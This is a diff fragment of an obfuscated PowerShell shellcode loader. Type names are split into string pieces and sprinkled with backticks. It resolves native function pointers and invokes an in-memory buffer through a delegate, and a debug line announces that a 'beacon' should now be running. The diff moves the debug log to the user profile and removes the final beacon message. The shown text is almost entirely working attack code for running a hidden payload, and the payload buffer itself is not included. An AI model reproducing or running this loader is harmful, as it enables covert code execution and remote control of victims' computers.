@@ -1,4 +1,5 @@
-echo "[+] Payload successfully started" >> C:\debugpwsh\debug.txt
+echo "[+] Payload successfully started" >> %userprofile%\debugpwsh\debug.txt
+
 Set-itEm  ("vArIablE:o69"+"MR"+"f")  ([type]('appDO'+'MaIN')  )  ;  $lZV3g5  = [TyPe]('sysTeM.'+'R'+'eFLECTIO'+'N'+'.EM'+'it.'+'a'+'SSembL'+'yBuiL'+'De'+'R'+'ACc'+'ESS');  $qC0 = [tYPe]('s'+'ySTem.Re'+'flE'+'CT'+'ION.caLlInGC'+'o'+'N'+'V'+'enTIons'); $eA6 = [TYpE]('sy'+'sTEM'+'.cONveR'+'t');  $UNbmkO  =[TyPE]('sYsTem.R'+'un'+'TiME.iNTeRo'+'pSE'+'rVICeS.m'+'ARsh'+'AL');  sv ("hmka"+"1")  ( [TYpE]('INtPt'+'r') ) ;  SEt-STr`ICtmo`De -Version 2
 
 function f`U`Nc_GET_pRO`C_aDd`RESS {
@@ -35,5 +36,4 @@ If ( $hmKa1::"Si`ZE" -eq 8) {
 	${V`A`R_rUNME} =   (GeT-VaRIablE unbMko  -VALUeOnL  )::"getdE`Le`G`AtefoR`FunCTiOnpOIntER"(${vaR_`BU`FFER}, (FUNC`_ge`T_De`LEgAtE`_Ty`Pe @([IntPtr]) ([Void])))
 	${v`A`R_`Runme}."i`NvOkE"(  (geT-ITem  ("VarIAB"+"LE:H"+"mk"+"A1") ).VAlue::"Z`eRo")
 }
-echo "[+] Payload ended. you should have a beacon now" >> C:\debugpwsh\debug.txt
 
